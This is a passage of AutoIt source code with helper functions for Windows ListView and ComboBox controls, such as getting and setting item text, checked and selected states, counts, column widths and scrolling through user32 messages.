; Author(s)			:	Anonymous
; Note(s)			:
;===============================================================================
Func _LvGetCheckedCount($nCtrl)
	If _LvHasCheckStyle($nCtrl) Then
		Local $count = 0
		For $x = 0 To _GUICtrlListView_GetItemCount($nCtrl) - 1
			If _GUICtrlListView_GetItemChecked($nCtrl, $x) Then $count += 1
		Next
		Return $count
	EndIf
	Return 0
EndFunc   ;==>_LvGetCheckedCount

;===============================================================================
; Function Name	:	_GetComboInfo
; Description		:
; Parameter(s)		:	$nCtrl		ComboBox control to get info for
;							$type		 	0= return edit hwnd, 1=  return list hwnd
;
; Requirement(s)	:
; Return Value(s)	:	return either the combos edit or list hwnd, or zero otherwise
; User CallTip		:
; Author(s)			:	Anonymous
; Note(s)			:
;===============================================================================
Func _GetComboInfo($nCtrl, $type = 0)
	;ConsoleWrite(" _GetClassName:"&_GetClassName($nCtrl)&@LF)
	If _GetClassName($nCtrl) <> "ComboBox" Then Return 0
	Local $ret, $cbInfo, $v_ret
	$cbInfo = DllStructCreate("int;int[4];int[4];int;int;int;int")
	DllStructSetData($cbInfo, 1, DllStructGetSize($cbInfo))
	$v_ret = DllCall("user32.dll", "int", "GetComboBoxInfo", "hwnd", GUICtrlGetHandle($nCtrl), "ptr", DllStructGetPtr($cbInfo))
	If IsArray($v_ret) Then
		If $type = 0 Then
			$ret = DllStructGetData($cbInfo, 6);edit handle
			;ConsoleWrite("Text ="&WinGetText($ret)&@LF)
		ElseIf $type = 1 Then
			$ret = DllStructGetData($cbInfo, 7);list handle
		EndIf
	EndIf
	$cbInfo = 0
	Return $ret
EndFunc   ;==>_GetComboInfo
Func _InvalidateRect($hwnd)
	Local $v_ret = DllCall("user32.dll", "int", "InvalidateRect", "hwnd", $hwnd, "ptr", 0, "int", 1)
	Return $v_ret[0]
EndFunc   ;==>_InvalidateRect

Func _UpdateWindow($hwnd)
	Local $v_ret = DllCall("user32.dll", "int", "UpdateWindow", "hwnd", $hwnd)
	Return $v_ret[0]
EndFunc   ;==>_UpdateWindow
;;;ripped from help file.
; Convert the client (GUI) coordinates to screen (desktop) coordinates
Func ClientToScreen($hwnd, ByRef $x, ByRef $y)
	Local $stPoint = DllStructCreate("int;int")
	DllStructSetData($stPoint, 1, $x)
	DllStructSetData($stPoint, 2, $y)
	DllCall("user32.dll", "int", "ClientToScreen", "hwnd", $hwnd, "ptr", DllStructGetPtr($stPoint))
	$x = DllStructGetData($stPoint, 1)
	$y = DllStructGetData($stPoint, 2)
	; release Struct not really needed as it is a local
	$stPoint = 0
EndFunc   ;==>ClientToScreen
Func _HiWord($x)
	Return BitShift($x, 16)
EndFunc   ;==>_HiWord

Func _LoWord($x)
	Return BitAND($x, 0xFFFF)
EndFunc   ;==>_LoWord

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlListView_GetColumnCount
; Description ...: Retrieve the number of columns
; Syntax.........: _GUICtrlListView_GetColumnCount($hWnd)
; Parameters ....: $hWnd        - Handle to the control
; Return values .: Success      - Number of columns
; Author ........: Anonymous
; Modified.......:
; Remarks .......:
; Related .......:
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlListView_GetColumnCount($hwnd)
	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"

;~ 	Local Const $HDM_GETITEMCOUNT = 0x1200
	Return _SendMessage(_GUICtrlListView_GetHeader($hwnd), 0x1200)
EndFunc   ;==>_GUICtrlListView_GetColumnCount

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlListView_SetItemChecked
; Description ...: Sets the checked state
; Syntax.........: _GUICtrlListView_SetItemChecked($hWnd, $iIndex[, $fCheck = True])
; Parameters ....: $hWnd        - Handle to the control
;                  $iIndex      - Zero-based index of the item, -1 sets all items
;                  $fCheck      - Value to set checked state to:
;                  | True       - Checked
;                  |False       - Not checked
; Return values .: Success      - True
;                  Failure      - False
; Author ........: Anonymous
; Modified.......:
; Remarks .......: Use only on controls that have the $LVS_EX_CHECKBOXES extended style
; Related .......: _GUICtrlListView_GetItemChecked
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlListView_SetItemChecked($hwnd, $iIndex, $fCheck = True)
	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"

	Local $fUnicode = _GUICtrlListView_GetUnicodeFormat($hwnd)

	Local $pMemory, $tMemMap, $iRet

	Local $tItem = DllStructCreate($tagLVITEM)
	Local $pItem = DllStructGetPtr($tItem)
	Local $iItem = DllStructGetSize($tItem)
	If @error Then Return SetError(-1, -1, -1) ; $LV_ERR = -1
	If $iIndex <> -1 Then
		DllStructSetData($tItem, "Mask", 0x00000008) ; $LVIF_STATE = 0x00000008
		DllStructSetData($tItem, "Item", $iIndex)
		If ($fCheck) Then
			DllStructSetData($tItem, "State", 0x2000)
		Else
			DllStructSetData($tItem, "State", 0x1000)
		EndIf
		DllStructSetData($tItem, "StateMask", 0xf000)
		If IsHWnd($hwnd) Then
			If _WinAPI_InProcess($hwnd, $_lv_ghLastWnd) Then
				Return _SendMessage($hwnd, 0x1000 + 76, 0, $pItem, 0, "wparam", "ptr") <> 0 ; $LVM_SETITEMW = ($LVM_FIRST + 76)
			Else
				$pMemory = _MemInit($hwnd, $iItem, $tMemMap)
				_MemWrite($tMemMap, $pItem)
				If $fUnicode Then
					$iRet = _SendMessage($hwnd, 0x1000 + 76, 0, $pMemory, 0, "wparam", "ptr") ; $LVM_SETITEMW = ($LVM_FIRST + 76)
				Else
					$iRet = _SendMessage($hwnd, 0x1000 + 6, 0, $pMemory, 0, "wparam", "ptr") ; $LVM_SETITEMA = ($LVM_FIRST + 6)
				EndIf
				_MemFree($tMemMap)
				Return $iRet <> 0
			EndIf
		Else
			If $fUnicode Then
				Return GUICtrlSendMsg($hwnd, 0x1000 + 76, 0, $pItem) <> 0 ; $LVM_SETITEMW = ($LVM_FIRST + 76)
			Else
				Return GUICtrlSendMsg($hwnd, 0x1000 + 6, 0, $pItem) <> 0 ; $LVM_SETITEMA = ($LVM_FIRST + 6)
			EndIf
		EndIf
	Else
		For $x = 0 To _GUICtrlListView_GetItemCount($hwnd) - 1
			DllStructSetData($tItem, "Mask", 0x00000008) ; $LVIF_STATE = 0x00000008
			DllStructSetData($tItem, "Item", $x)
			If ($fCheck) Then
				DllStructSetData($tItem, "State", 0x2000)
			Else
				DllStructSetData($tItem, "State", 0x1000)
			EndIf
			DllStructSetData($tItem, "StateMask", 0xf000)
			If IsHWnd($hwnd) Then
				If _WinAPI_InProcess($hwnd, $_lv_ghLastWnd) Then
					If Not _SendMessage($hwnd, 0x1000 + 76, 0, $pItem, 0, "wparam", "ptr") <> 0 Then Return SetError(-1, -1, -1) ; $LV_ERR = -1 $LVM_SETITEMW = ($LVM_FIRST + 76)
				Else
					$pMemory = _MemInit($hwnd, $iItem, $tMemMap)
					_MemWrite($tMemMap, $pItem)
					If $fUnicode Then
						$iRet = _SendMessage($hwnd, 0x1000 + 76, 0, $pMemory, 0, "wparam", "ptr") ; $LVM_SETITEMW = ($LVM_FIRST + 76)
					Else
						$iRet = _SendMessage($hwnd, 0x1000 + 6, 0, $pMemory, 0, "wparam", "ptr") ; $LVM_SETITEMA = ($LVM_FIRST + 6)
					EndIf
					_MemFree($tMemMap)
					If Not $iRet <> 0 Then Return SetError(-1, -1, -1) ; $LV_ERR = -1
				EndIf
			Else
				If $fUnicode Then
					If Not GUICtrlSendMsg($hwnd, 0x1000 + 76, 0, $pItem) <> 0 Then Return SetError(-1, -1, -1) ; $LV_ERR = -1 $LVM_SETITEMW = ($LVM_FIRST + 76)
				Else
					If Not GUICtrlSendMsg($hwnd, 0x1000 + 6, 0, $pItem) <> 0 Then Return SetError(-1, -1, -1) ; $LV_ERR = -1 $LVM_SETITEMA = ($LVM_FIRST + 6)
				EndIf
			EndIf
		Next
		Return True
	EndIf
	Return False
EndFunc   ;==>_GUICtrlListView_SetItemChecked

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlListView_SetItemText
; Description ...: Changes the text of an item or subitem
; Syntax.........: _GUICtrlListView_SetItemText($hWnd, $iIndex, $sText[, $iSubItem = 0])
; Parameters ....: $hWnd        - Handle to the control
;                  $iIndex      - Zero based index of the item
;                  $sText       - Item or subitem text
;                  $iSubItem    - One based index of the subitem or 0 to set the item
; Return values .: Success      - True
;                  Failure      - False
; Author ........: Anonymous
; Modified.......: Anonymous
; Remarks .......: If $iSubItem = -1 row is set
; Related .......: _GUICtrlListView_GetItemText, _GUICtrlListView_GetItemTextArray, _GUICtrlListView_GetItemTextString, _GUICtrlListView_InsertItem
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlListView_SetItemText($hwnd, $iIndex, $sText, $iSubItem = 0)
	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"

	Local $fUnicode = _GUICtrlListView_GetUnicodeFormat($hwnd)

	Local $iRet

	If $iSubItem = -1 Then
		Local $SeparatorChar = Opt('GUIDataSeparatorChar')
		Local $i_cols = _GUICtrlListView_GetColumnCount($hwnd)
		Local $a_text = StringSplit($sText, $SeparatorChar)
		If $i_cols > $a_text[0] Then $i_cols = $a_text[0]
		For $i = 1 To $i_cols
			$iRet = _GUICtrlListView_SetItemText($hwnd, $iIndex, $a_text[$i], $i - 1)
			If Not $iRet Then ExitLoop
		Next
		Return $iRet
	EndIf

	Local $iBuffer = StringLen($sText) + 1
	Local $tBuffer
	If $fUnicode Then
		$tBuffer = DllStructCreate("wchar Text[" & $iBuffer & "]")
		$iBuffer *= 2
	Else
		$tBuffer = DllStructCreate("char Text[" & $iBuffer & "]")
	EndIf
	Local $pBuffer = DllStructGetPtr($tBuffer)
	Local $tItem = DllStructCreate($tagLVITEM)
	Local $pItem = DllStructGetPtr($tItem)
	DllStructSetData($tBuffer, "Text", $sText)
	DllStructSetData($tItem, "Mask", 0x00000001) ; $LVIF_TEXT = 0x00000001
	DllStructSetData($tItem, "item", $iIndex)
	DllStructSetData($tItem, "SubItem", $iSubItem)
	If IsHWnd($hwnd) Then
		If _WinAPI_InProcess($hwnd, $_lv_ghLastWnd) Then
			DllStructSetData($tItem, "Text", $pBuffer)
			$iRet = _SendMessage($hwnd, 0x1000 + 76, 0, $pItem, 0, "wparam", "ptr") ; $LVM_SETITEMW = ($LVM_FIRST + 76)
		Else
			Local $iItem = DllStructGetSize($tItem)
			Local $tMemMap
			Local $pMemory = _MemInit($hwnd, $iItem + $iBuffer, $tMemMap)
			Local $pText = $pMemory + $iItem
			DllStructSetData($tItem, "Text", $pText)
			_MemWrite($tMemMap, $pItem, $pMemory, $iItem)
			_MemWrite($tMemMap, $pBuffer, $pText, $iBuffer)
			If $fUnicode Then
				$iRet = _SendMessage($hwnd, 0x1000 + 76, 0, $pMemory, 0, "wparam", "ptr") ; $LVM_SETITEMW = ($LVM_FIRST + 76)
			Else
				$iRet = _SendMessage($hwnd, 0x1000 + 6, 0, $pMemory, 0, "wparam", "ptr") ; $LVM_SETITEMA = ($LVM_FIRST + 6)
			EndIf
			_MemFree($tMemMap)
		EndIf
	Else
		DllStructSetData($tItem, "Text", $pBuffer)
		If $fUnicode Then
			$iRet = GUICtrlSendMsg($hwnd, 0x1000 + 76, 0, $pItem) ; $LVM_SETITEMW = ($LVM_FIRST + 76)
		Else
			$iRet = GUICtrlSendMsg($hwnd, 0x1000 + 6, 0, $pItem) ; $LVM_SETITEMA = ($LVM_FIRST + 6)
		EndIf
	EndIf
	Return $iRet <> 0
EndFunc   ;==>_GUICtrlListView_SetItemText

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlListView_GetItemCount
; Description ...: Retrieves the number of items in a list-view control
; Syntax.........: _GUICtrlListView_GetItemCount($hWnd)
; Parameters ....: $hWnd        - Handle to the control
; Return values .: Success      - The number of items
; Author ........: Anonymous
; Modified.......:
; Remarks .......:
; Related .......: _GUICtrlListView_SetItemCount
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlListView_GetItemCount($hwnd)
	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"

	If IsHWnd($hwnd) Then
		Return _SendMessage($hwnd, 0x1000 + 4) ; $LVM_GETITEMCOUNT = ($LVM_FIRST + 4)
	Else
		Return GUICtrlSendMsg($hwnd, 0x1000 + 4, 0, 0) ; $LVM_GETITEMCOUNT = ($LVM_FIRST + 4)
	EndIf
EndFunc   ;==>_GUICtrlListView_GetItemCount

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlListView_GetItemChecked
; Description ...: Returns the check state for a list-view control item
; Syntax.........: _GUICtrlListView_GetItemChecked($hWnd, $iIndex)
; Parameters ....: $hWnd        - Handle to the control
;                  $iIndex      - Zero based item index to retrieve item check state from
; Return values .: Success      - True
;                  Failure      - False
; Author ........: Anonymous
; Modified.......: Siao for external control
; Remarks .......:
; Related .......: _GUICtrlListView_SetItemChecked
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlListView_GetItemChecked($hwnd, $iIndex)
	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"

	Local $fUnicode = _GUICtrlListView_GetUnicodeFormat($hwnd)

	Local $tLVITEM = DllStructCreate($tagLVITEM)
	Local $iSize = DllStructGetSize($tLVITEM)
	Local $pItem = DllStructGetPtr($tLVITEM)
	If @error Then Return SetError(-1, -1, False) ; $LV_ERR = -1
	DllStructSetData($tLVITEM, "Mask", 0x00000008) ; $LVIF_STATE = 0x00000008
	DllStructSetData($tLVITEM, "Item", $iIndex)
	DllStructSetData($tLVITEM, "StateMask", 0xffff)

	Local $iRet
	If IsHWnd($hwnd) Then
		If _WinAPI_InProcess($hwnd, $_lv_ghLastWnd) Then
			$iRet = _SendMessage($hwnd, 0x1000 + 75, 0, $pItem, 0, "wparam", "ptr") <> 0 ; $LVM_GETITEMW = ($LVM_FIRST + 75)
		Else
			Local $tMemMap
			Local $pMemory = _MemInit($hwnd, $iSize, $tMemMap)
			_MemWrite($tMemMap, $pItem)
			If $fUnicode Then
				$iRet = _SendMessage($hwnd, 0x1000 + 75, 0, $pMemory, 0, "wparam", "ptr") <> 0 ; $LVM_GETITEMW = ($LVM_FIRST + 75)
			Else
				$iRet = _SendMessage($hwnd, 0x1000 + 5, 0, $pMemory, 0, "wparam", "ptr") <> 0 ; $LVM_GETITEMA = ($LVM_FIRST + 5)
			EndIf
			_MemRead($tMemMap, $pMemory, $pItem, $iSize)
			_MemFree($tMemMap)
		EndIf
	Else
		If $fUnicode Then
			$iRet = GUICtrlSendMsg($hwnd, 0x1000 + 75, 0, $pItem) <> 0 ; $LVM_GETITEMW = ($LVM_FIRST + 75)
		Else
			$iRet = GUICtrlSendMsg($hwnd, 0x1000 + 5, 0, $pItem) <> 0 ; $LVM_GETITEMA = ($LVM_FIRST + 5)
		EndIf
	EndIf

	If Not $iRet Then Return SetError(-1, -1, False) ; $LV_ERR = -1
	Return BitAND(DllStructGetData($tLVITEM, "State"), 0x2000) <> 0
EndFunc   ;==>_GUICtrlListView_GetItemChecked

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlListView_GetItemText
; Description ...: Retrieves the text of an item or subitem
; Syntax.........: _GUICtrlListView_GetItemText($hWnd, $iIndex[, $iSubItem = 0])
; Parameters ....: $hWnd        - Handle to the control
;                  $iIndex      - Zero based index of the item
;                  $iSubItem    - One based sub item index
; Return values .: Success      - Item or subitem text
; Author ........: Anonymous
; Modified.......: Anonymous
; Remarks .......: To retrieve the item text, set iSubItem to zero. To retrieve the text of a subitem, set iSubItem to the one
;                  based subitem's index.
; Related .......: _GUICtrlListView_SetItemText, _GUICtrlListView_GetItemTextArray, _GUICtrlListView_GetItemTextString
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlListView_GetItemText($hwnd, $iIndex, $iSubItem = 0)
	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"

	Local $fUnicode = _GUICtrlListView_GetUnicodeFormat($hwnd)

	Local $tBuffer
	If $fUnicode Then
		$tBuffer = DllStructCreate("wchar Text[4096]")
	Else
		$tBuffer = DllStructCreate("char Text[4096]")
	EndIf
	Local $pBuffer = DllStructGetPtr($tBuffer)
	Local $tItem = DllStructCreate($tagLVITEM)
	Local $pItem = DllStructGetPtr($tItem)
	DllStructSetData($tItem, "SubItem", $iSubItem)
	DllStructSetData($tItem, "TextMax", 4096)
	If IsHWnd($hwnd) Then
		If _WinAPI_InProcess($hwnd, $_lv_ghLastWnd) Then
			DllStructSetData($tItem, "Text", $pBuffer)
			_SendMessage($hwnd, 0x1000 + 115, $iIndex, $pItem, 0, "wparam", "ptr") ; $LVM_GETITEMTEXTW = ($LVM_FIRST + 115)
		Else
			Local $iItem = DllStructGetSize($tItem)
			Local $tMemMap
			Local $pMemory = _MemInit($hwnd, $iItem + 4096, $tMemMap)
			Local $pText = $pMemory + $iItem
			DllStructSetData($tItem, "Text", $pText)
			_MemWrite($tMemMap, $pItem, $pMemory, $iItem)
			If $fUnicode Then
				_SendMessage($hwnd, 0x1000 + 115, $iIndex, $pMemory, 0, "wparam", "ptr") ; $LVM_GETITEMTEXTW = ($LVM_FIRST + 115)
			Else
				_SendMessage($hwnd, 0x1000 + 45, $iIndex, $pMemory, 0, "wparam", "ptr") ; $LVM_GETITEMTEXTA = ($LVM_FIRST + 45)
			EndIf
			_MemRead($tMemMap, $pText, $pBuffer, 4096)
			_MemFree($tMemMap)
		EndIf
	Else
		DllStructSetData($tItem, "Text", $pBuffer)
		If $fUnicode Then
			GUICtrlSendMsg($hwnd, 0x1000 + 115, $iIndex, $pItem) ; $LVM_GETITEMTEXTW = ($LVM_FIRST + 115)
		Else
			GUICtrlSendMsg($hwnd, 0x1000 + 45, $iIndex, $pItem) ; $LVM_GETITEMTEXTA = ($LVM_FIRST + 45)
		EndIf
	EndIf
	Return DllStructGetData($tBuffer, "Text")
EndFunc   ;==>_GUICtrlListView_GetItemText

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlListView_GetSelectedCount
; Description ...: Determines the number of selected items
; Syntax.........: _GUICtrlListView_GetSelectedCount($hWnd)
; Parameters ....: $hWnd        - Handle to the control
; Return values .: Success      - The number of selected items
; Author ........: Anonymous
; Modified.......:
; Remarks .......:
; Related .......:
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlListView_GetSelectedCount($hwnd)
	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"

	If IsHWnd($hwnd) Then
		Return _SendMessage($hwnd, 0x1000 + 50) ; $LVM_GETSELECTEDCOUNT = ($LVM_FIRST + 50)
	Else
		Return GUICtrlSendMsg($hwnd, 0x1000 + 50, 0, 0) ; $LVM_GETSELECTEDCOUNT = ($LVM_FIRST + 50)
	EndIf
EndFunc   ;==>_GUICtrlListView_GetSelectedCount

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlListView_DeleteAllItems
; Description ...: Removes all items from a list-view control
; Syntax.........: _GUICtrlListView_DeleteAllItems($hWnd)
; Parameters ....: $hWnd        - Control ID/Handle to the control
; Return values .: Success      - True
;                  Failure      - False
; Author ........: Anonymous
; Modified.......:
; Remarks .......:
; Related .......: _GUICtrlListView_DeleteItem, _GUICtrlListView_DeleteItemsSelected
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlListView_DeleteAllItems($hwnd)
	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"

	If _GUICtrlListView_GetItemCount($hwnd) == 0 Then Return True
	If IsHWnd($hwnd) Then
		Return _SendMessage($hwnd, 0x1000 + 9) <> 0 ; $LVM_DELETEALLITEMS = ($LVM_FIRST + 9)
	Else
		Local $ctrlID
		For $index = _GUICtrlListView_GetItemCount($hwnd) - 1 To 0 Step -1
			$ctrlID = _GUICtrlListView_GetItemParam($hwnd, $index)
			If $ctrlID Then GUICtrlDelete($ctrlID)
		Next
		If _GUICtrlListView_GetItemCount($hwnd) == 0 Then Return True
	EndIf
	Return False
EndFunc   ;==>_GUICtrlListView_DeleteAllItems

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlListView_GetSelectedIndices
; Description ...: Retrieve indices of selected item(s)
; Syntax.........: _GUICtrlListView_GetSelectedIndices($hWnd, $fArray = False)
; Parameters ....: $hWnd        - Handle to the control
;                  $fArray      - Return string or Array
;                  |True - Returns array
;                  |False - Returns pipe "|" delimited string
; Return values .: Success      - Selected indices Based on $fArray:
;                  +Array       - With the following format
;                  |[0] - Number of Items in array (n)
;                  |[1] - First item index
;                  |[2] - Second item index
;                  |[n] - Last item index
;                  |String      - With the following format
;                  |"0|1|2|n"
;                  Failure      - Based on $fArray
;                  |Array       - With the following format
;                  |[0] - Number of Items in array (0)
;                  |String      - Empty ("")
; Author ........: Anonymous
; Modified.......:
; Remarks .......:
; Related .......:
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlListView_GetSelectedIndices($hwnd, $fArray = False)
	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"

	Local $sIndices, $aIndices[1] = [0]
	Local $iRet, $iCount = _GUICtrlListView_GetItemCount($hwnd)
	For $iItem = 0 To $iCount
		If IsHWnd($hwnd) Then
			$iRet = _SendMessage($hwnd, 0x1000 + 44, $iItem, 0x0002) ; $LVM_GETITEMSTATE = ($LVM_FIRST + 44) $LVIS_SELECTED = 0x0002
		Else
			$iRet = GUICtrlSendMsg($hwnd, 0x1000 + 44, $iItem, 0x0002) ; $LVM_GETITEMSTATE = ($LVM_FIRST + 44) $LVIS_SELECTED = 0x0002
		EndIf
		If $iRet Then
			If (Not $fArray) Then
				If StringLen($sIndices) Then
					$sIndices &= "|" & $iItem
				Else
					$sIndices = $iItem
				EndIf
			Else
				ReDim $aIndices[UBound($aIndices) + 1]
				$aIndices[0] = UBound($aIndices) - 1
				$aIndices[UBound($aIndices) - 1] = $iItem
			EndIf
		EndIf
	Next
	If (Not $fArray) Then
		Return String($sIndices)
	Else
		Return $aIndices
	EndIf
EndFunc   ;==>_GUICtrlListView_GetSelectedIndices

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlListView_SetItemSelected
; Description ...: Sets whether the item is selected
; Syntax.........: _GUICtrlListView_SetItemSelected($hWnd, $iIndex[, $fSelected = True[, $fFocused = False]])
; Parameters ....: $hWnd        - Handle to the control
;                  $iIndex      - Zero based index of the item, -1 to set selected state of all items
;                  $fSelected   - If True the item(s) are selected, otherwise not.
;                  $fFocused    - If True the item has focus, otherwise not.
; Return values .: Success      - True
;                  Failure      - False
; Author ........: Anonymous
; Modified.......:
; Remarks .......:
; Related .......: _GUICtrlListView_GetItemSelected
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlListView_SetItemSelected($hwnd, $iIndex, $fSelected = True, $fFocused = False)
	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"

	Local $tstruct = DllStructCreate($tagLVITEM)
	Local $pItem = DllStructGetPtr($tstruct)
	Local $iRet, $iSelected = 0, $iFocused = 0, $iSize, $tMemMap, $pMemory
	If ($fSelected = True) Then $iSelected = 0x0002 ; $LVIS_SELECTED = 0x0002
	If ($fFocused = True And $iIndex <> -1) Then $iFocused = 0x0001 ; $LVIS_FOCUSED = 0x0001
	DllStructSetData($tstruct, "Mask", 0x00000008) ; $LVIF_STATE = 0x00000008
	DllStructSetData($tstruct, "Item", $iIndex)
	DllStructSetData($tstruct, "State", BitOR($iSelected, $iFocused))
	DllStructSetData($tstruct, "StateMask", BitOR(0x0002, $iFocused)) ; $LVIS_SELECTED = 0x0002
	$iSize = DllStructGetSize($tstruct)
	If IsHWnd($hwnd) Then
		$pMemory = _MemInit($hwnd, $iSize, $tMemMap)
		_MemWrite($tMemMap, $pItem, $pMemory, $iSize)
		$iRet = _SendMessage($hwnd, 0x1000 + 43, $iIndex, $pMemory) ; $LVM_SETITEMSTATE = ($LVM_FIRST + 43)
		_MemFree($tMemMap)
	Else
		$iRet = GUICtrlSendMsg($hwnd, 0x1000 + 43, $iIndex, $pItem) ; $LVM_SETITEMSTATE = ($LVM_FIRST + 43)
	EndIf
	Return $iRet <> 0
EndFunc   ;==>_GUICtrlListView_SetItemSelected

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlListView_DeleteItem
; Description ...: Removes an item from a list-view control
; Syntax.........: _GUICtrlListView_DeleteItem($hWnd, $iIndex)
; Parameters ....: $hWnd        - Control ID/Handle to the control
;                  $iIndex      - Zero based index of the list-view item to delete
; Return values .: Success      - True
;                  Failure      - False
; Author ........: Anonymous
; Modified.......:
; Remarks .......:
; Related .......: _GUICtrlListView_DeleteAllItems, _GUICtrlListView_DeleteItemsSelected
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlListView_DeleteItem($hwnd, $iIndex)
	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"

	If IsHWnd($hwnd) Then
		Return _SendMessage($hwnd, 0x1000 + 8, $iIndex) <> 0 ; $LVM_DELETEITEM = ($LVM_FIRST + 8)
	Else
		Local $ctrlID = _GUICtrlListView_GetItemParam($hwnd, $iIndex)
		If $ctrlID Then Return GUICtrlDelete($ctrlID) <> 0
	EndIf
	Return False
EndFunc   ;==>_GUICtrlListView_DeleteItem

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlListView_GetColumnWidth
; Description ...: Retrieves the width of a column in report or list view
; Syntax.........: _GUICtrlListView_GetColumnWidth($hWnd, $iCol)
; Parameters ....: $hWnd        - Handle to the control
;                  $iCol        - The index of the column. This parameter is ignored in list view.
; Return values .: Success      - Column width
;                  Failure      - Zero
; Author ........: Anonymous
; Modified.......:
; Remarks .......: If this message is sent to a list-view control with the $LVS_REPORT style
;                  and the specified column doesn't exist, the return value is undefined.
; Related .......: _GUICtrlListView_SetColumnWidth
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlListView_GetColumnWidth($hwnd, $iCol)
	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"

	If IsHWnd($hwnd) Then
		Return _SendMessage($hwnd, 0x1000 + 29, $iCol) ; $LVM_GETCOLUMNWIDTH = ($LVM_FIRST + 29)
	Else
		Return GUICtrlSendMsg($hwnd, 0x1000 + 29, $iCol, 0) ; $LVM_GETCOLUMNWIDTH = ($LVM_FIRST + 29)
	EndIf
EndFunc   ;==>_GUICtrlListView_GetColumnWidth

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlListView_Scroll
; Description ...: Scrolls the content of a list-view
; Syntax.........: _GUICtrlListView_Scroll($hWnd, $iDX, $iDY)
; Parameters ....: $hWnd        - Handle to the control
;                  $iDX         - Value of type int that specifies the amount of horizontal scrolling in pixels.
;                  +If the list-view control is in list-view, this value specifies the number of columns to scroll
;                  $iDY         - Value of type int that specifies the amount of vertical scrolling in pixels
; Return values .: Success      - True
;                  Failure      - False
; Author ........: Anonymous
; Modified.......:
; Remarks .......: When the list-view control is in report view, the control can only be scrolled vertically in whole
;                  line increments.  Therefore, the $iDY parameter will be rounded to the nearest number of pixels
;                  that form a whole line increment.  For example, if the height of a line is 16 pixels and 8 is passed
;                  for $iDY, the list will be scrolled by 16 pixels (1 line). If 7 is passed for $iDY, the list will be
;                  scrolled 0 pixels (0 lines).
; Related .......:
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlListView_Scroll($hwnd, $iDX, $iDY)
	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"

	If IsHWnd($hwnd) Then
		Return _SendMessage($hwnd, 0x1000 + 20, $iDX, $iDY) <> 0 ; $LVM_SCROLL = ($LVM_FIRST + 20)
	Else
		Return GUICtrlSendMsg($hwnd, 0x1000 + 20, $iDX, $iDY) <> 0 ; $LVM_SCROLL = ($LVM_FIRST + 20)
	EndIf
EndFunc   ;==>_GUICtrlListView_Scroll

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlListView_GetExtendedListViewStyle
; Description ...: Retrieves the extended styles that are currently in use
; Syntax.........: _GUICtrlListView_GetExtendedListViewStyle($hWnd)
; Parameters ....: $hWnd        - Handle to the control
; Return values .: Success      - DWORD that represents the styles currently in use for a given list-view
; Author ........: Anonymous
; Modified.......:
; Remarks .......:
; Related .......: _GUICtrlListView_SetExtendedListViewStyle
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlListView_GetExtendedListViewStyle($hwnd)
	If $Debug_LV Then __UDF_ValidateClassName($hwnd, "SysListView32") ; $__LISTVIEWCONSTANT_ClassName = "SysListView32"

	If IsHWnd($hwnd) Then
		Return _SendMessage($hwnd, 0x1000 + 55) ; $LVM_GETEXTENDEDLISTVIEWSTYLE = ($LVM_FIRST + 55)
	Else
		Return GUICtrlSendMsg($hwnd, 0x1000 + 55, 0, 0) ; $LVM_GETEXTENDEDLISTVIEWSTYLE = ($LVM_FIRST + 55)
	EndIf
